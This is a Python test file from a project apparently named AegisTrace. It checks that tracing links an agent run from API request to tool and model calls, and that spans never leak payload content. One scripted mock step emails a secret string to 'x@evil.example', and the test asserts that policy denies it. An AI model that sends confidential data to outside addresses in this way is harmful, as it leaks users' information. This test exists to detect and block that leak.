# SPDX-License-Identifier: FSL-1.1-ALv2
# Copyright 2026 AegisTrace contributors
"""One trace follows a run from the API request, through the outbox and queue,
into the worker and every policy decision, tool and model call. Spans carry
identifiers and outcomes, never payload content."""

from __future__ import annotations

import json
import logging

import pytest
from opentelemetry import trace
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import SimpleSpanProcessor
from opentelemetry.sdk.trace.export.in_memory_span_exporter import InMemorySpanExporter

from tests.contract.conftest import auth

SECRET = "quarterly-numbers-do-not-share"


@pytest.fixture(scope="module")
def spans():
    exporter = InMemorySpanExporter()
    provider = trace.get_tracer_provider()
    if not isinstance(provider, TracerProvider):
        provider = TracerProvider()
        trace.set_tracer_provider(provider)
    provider.add_span_processor(SimpleSpanProcessor(exporter))
    return exporter


def _attrs_text(span) -> str:
    return json.dumps({k: str(v) for k, v in (span.attributes or {}).items()}) + span.name


def test_one_trace_from_api_request_to_tools_and_model(client, issuer, harness, tenant, spans):
    spans.clear()
    h, t = harness, tenant
    h.grant(t, "calc.add", 0)
    r = client.post(
        "/v1/runs",
        headers={**auth(issuer, t.tenant_id), "Idempotency-Key": "k_trace_000000001"},
        json={
            "agent_id": t.agent_id,
            "input": {
                "task": SECRET,
                "mock_script": [
                    {"tool": "calc.add", "args": {"a": 40, "b": 2}},
                    {"tool": "email.send", "args": {"to": "x@evil.example", "subject": SECRET, "body": SECRET}},
                    {"final": SECRET},
                ],
            },
        },
    )
    assert r.status_code == 201, r.text
    run_id = r.json()["id"]
    h.pump()
    assert h.state(t, run_id) == "SUCCEEDED"

    got = spans.get_finished_spans()
    api = next(s for s in got if s.name == "POST /v1/runs")
    run = next(s for s in got if s.name == "run.execute" and s.attributes["aegis.run_id"] == run_id)
    assert run.context.trace_id == api.context.trace_id  # trace crossed the outbox and the queue
    assert run.kind is trace.SpanKind.CONSUMER and run.attributes["aegis.state"] == "SUCCEEDED"

    in_run = [s for s in got if s.context.trace_id == run.context.trace_id]
    names = [s.name for s in in_run]
    for expected in (
        "tool calc.add",
        "tool email.send",
        "policy.evaluate",
        "tool.execute",
        "model.complete",
        "evidence.checkpoint",
    ):
        assert expected in names, names
    email = next(s for s in in_run if s.name == "tool email.send")
    assert email.attributes["aegis.outcome"] == "denied" and email.attributes["aegis.reason"] == "no_matching_grant"
    decisions = {s.attributes["aegis.decision"] for s in in_run if s.name == "policy.evaluate"}
    assert decisions == {"allow", "deny"}
    model = next(s for s in in_run if s.name == "model.complete")
    assert model.attributes["gen_ai.system"] == "mock"

    assert all(SECRET not in _attrs_text(s) for s in got)  # no content in any span, anywhere
    assert all("/v1/runs/run_" not in s.name for s in got)  # names use route templates, not raw ids


def test_logs_carry_the_trace_id(spans):
    from aegistrace import tracing

    record = logging.LogRecord("t", logging.INFO, __file__, 1, "hello", None, None)
    with tracing.span("unit") as s:
        tracing.TraceContextFilter().filter(record)
    assert record.trace_id == format(s.get_span_context().trace_id, "032x")


def test_configure_is_off_unless_asked():
    from aegistrace import tracing

    assert tracing.configure("test", {}) is False  # no endpoint: tracing stays off (no-op spans)
    assert tracing.configure("test", {"AEGIS_TRACING": "off"}) is tracing._configured
